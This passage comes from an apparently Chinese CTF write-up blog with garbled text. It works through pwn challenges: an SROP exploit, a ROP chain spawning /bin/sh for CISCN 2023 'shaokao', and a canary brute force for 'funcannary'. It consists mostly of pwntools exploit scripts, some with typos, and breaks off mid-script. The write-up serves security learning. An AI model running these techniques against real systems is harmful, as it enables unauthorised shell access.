class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node2.yuzhian.com.cn&#x27;,35543)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x4011ee</span></span><br><span class="line">mov_rax_15 = <span class="number">0x401146</span></span><br><span class="line">bin_sh = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x4011C8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rax_15)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">str</span>(sigframe)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;F!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SROPå°èµ å“ï¼ˆ<a href="https://www.cnblogs.com/bpcat/p/16879300.html">https://www.cnblogs.com/bpcat/p/16879300.html</a>)</p><h3 id="ã€2023CISCNã€‘"><a href="#ã€2023CISCNã€‘" class="headerlink" title="ã€2023CISCNã€‘"></a>ã€2023CISCNã€‘</h3><h4 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a><strong>shaokao</strong></h4><p>ï¼ˆ1ï¼‰è™šæ‹Ÿæœºchecksecä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/0.png" alt="0"></p><p>ï¼ˆ2ï¼‰è¿è¡Œä¸€ä¸‹ç¨‹åºç©ç©</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.png" alt="1"></p><p>å‘ç°æ²¡ç¢°åˆ°ç‰¹åˆ«ä¹‹å¤„<br>ï¼ˆ3ï¼‰è½¬æˆ˜IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/2.png" alt="2"></p><p>æŸ¥çœ‹mianå‡½æ•°å‘ç°éšè—ç›®å½•5 è·Ÿè¸ªçœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/3.png" alt="3"></p><p>å‘ç°strcpy çŒœæµ‹v1è¿›è¡Œäº†æº¢å‡º</p><p>å†å¾€ä¸‹ç¿»ç¿»<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/4.png" alt="4"></p><p>syscall  ä»¥åŠsys_exit æ˜æ˜¾çš„ç³»ç»Ÿè°ƒç”¨å·</p><p>åˆ°dataæ®µæŸ¥æ‰¾å¯å†™å…¥å£<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/5.png" alt="5"></p><p>æœç´¢sys å‘ç°-result çŒœæµ‹è´Ÿæ•°ï¼ˆ-10000ï¼‰æ‰“å¼€ç›®å½•5<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527200932728.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/8.png" alt="8">ï¼ˆ4ï¼‰åˆ©ç”¨ROPgadget æ„é€ æ‰€éœ€execveç³»ç»Ÿè°ƒç”¨exp<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/61.png" alt="61"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/6.png" alt="6"></p><p>ï¼ˆ5ï¼‰æ„é€ å¯¹åº”exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.71.184&#x27;,23931)</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;ï¼Ÿ\n&quot;</span>,<span class="string">b&quot;-10000&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret _1</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret _59</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;çƒ§çƒ¤æ‘Šå„¿å·²å½’ä½ æ‰€æœ‰ï¼Œè¯·èµåï¼š&quot;</span>,p)</span><br><span class="line">r.interactive(ï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527201915278.png" alt="image-20230527201915278"></p><p>ä¼˜åŒ–åçš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">r=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.71.184&#x27;,23931)</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;ï¼Ÿ\n&quot;</span>,<span class="string">b&quot;-10000&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">pop_rsi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) </span><br><span class="line">pop_rax_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>)</span><br><span class="line">mov_rax_ptr_rsi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>)</span><br><span class="line">xor_rax_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>)</span><br><span class="line">pop_rdi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>)</span><br><span class="line">pop_rdx_rbx_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>)</span><br><span class="line"></span><br><span class="line">p = padding</span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>)   <span class="comment"># @ .data</span></span><br><span class="line">p += pop_rax_ret + <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += mov_rax_ptr_rsi_ret</span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>)   <span class="comment"># @ .data + 8</span></span><br><span class="line">p += xor_rax_ret</span><br><span class="line">p += mov_rax_ptr_rsi_ret</span><br><span class="line">p += pop_rdi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>)   <span class="comment"># @ .data</span></span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>)   <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pop_rdx_rbx_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>) + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">p += xor_rax_ret</span><br><span class="line">add_rip_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">rop_len = <span class="number">59</span></span><br><span class="line">rop_chain = [add_rip_ret] * rop_len<span class="comment">#æ„å»ºä¸€ä¸ªrop_len å®Œæˆexecve</span></span><br><span class="line">p += <span class="string">b&#x27;&#x27;</span>.join(rop_chain)<span class="comment">#å°†åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿›è¡Œå¡«å……</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;çƒ§çƒ¤æ‘Šå„¿å·²å½’ä½ æ‰€æœ‰ï¼Œè¯·èµåï¼š&quot;</span>,p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="ã€funcannaryã€‘"><a href="#ã€funcannaryã€‘" class="headerlink" title="ã€funcannaryã€‘"></a><strong>ã€funcannaryã€‘</strong></h4><p>æ¶¨çŸ¥è¯†æ¶¨çŸ¥è¯† æ²¡å­¦å¤Ÿçš„èœç‹—ğŸ˜€<br>ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ peiâ€™dé…å¥—checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™welcomeâ€™åœ¨çˆ†ç ´çš„expä¸­ä¼šç”¨ä½œäºè¦†ç›–èŠ‚ç‚¹</p><p>â€‹                              â€‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>â€‹         å‘ç°Canaryå’ŒPIEéƒ½å¼€ å‡†å¤‡å¥½çˆ†ç ´ï¼ˆå¦‚æœæœ‰å¯ä»¥åˆ©ç”¨çš„å­—ç¬¦ä¸²canaryä¹Ÿå¯ä»¥ç»•è¿‡ï¼‰<br>â€‹         å¯¹åº”éšæœºåŒ– åç»­åœ¨IDAä¸­åªèƒ½åˆ©ç”¨å…¶åœ°å€è®¡ç®—åç§»</p><p>ï¼ˆ2ï¼‰è¿›IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>forkæ¥å£ &#x3D;&#x3D; canaryçˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>å‘ç°å‡½æ•°å…¥å£ä¸º0x122D å¹¶ä¸”å‘ç°â€&#x2F;bin&#x2F;cat flagâ€ æ¥ä¸‹æ¥æ‰¾æº¢å‡ºä½ç½®çˆ†ç ´cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>æ˜æ˜¾æº¢å‡º å®šä½è¯¥å‡½æ•°sub_128Aï¼ˆçˆ†ç ´canaryçš„ä½ç½®ï¼‰çˆ†ç ´æˆåŠŸåçˆ†è¿”å›åœ°å€ ï¼ˆçˆ†canaryåœ°å€çš„ä¸‹ä¸€ä½ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>å‡½æ•°å…¥å£ä¸º0x122D shellè¿”å›åœ°å€ä¸º1329 åç§»ä¸º0xfc è¦†ç›–çš„bufå¤§å°ä¸º0x62</p><p><strong>tips</strong><br>ã€1ã€‘canaryå¤§å°ä¸º0x00-0xff æ‰€ä»¥çˆ†ç ´æ—¶æ¯å­—èŠ‚éœ€å¾ªç¯257æ¬¡ åˆå› ä¸ºcanaryä½ä¸‰ä½å®šä¸º\x00ï¼ˆ32ä½çˆ†ç ´å¾ªç¯3æ¬¡ 64ä½å¾ªç¯7æ¬¡ï¼‰æ­¤å¤„éœ€å¾ªç¯7æ¬¡<br>ã€2ã€‘ç¨‹åºå…¥å£ç‚¹ä¸€èˆ¬éƒ½æ˜¯æ•´æ•°ï¼Œå³åœ°å€æœ€ä½ä½ä¸º00ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„åœ°å€ï¼Œ0x29æ˜¯å¯ä¿¡çš„ã€‚å°±åªè¦çˆ†ç ´åä¸€ä½å°±OKï¼Œå†åé¢çš„åœ°å€éƒ½ç›¸åŒï¼Œçˆ†ä¸çˆ†éƒ½ä¸€æ ·ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 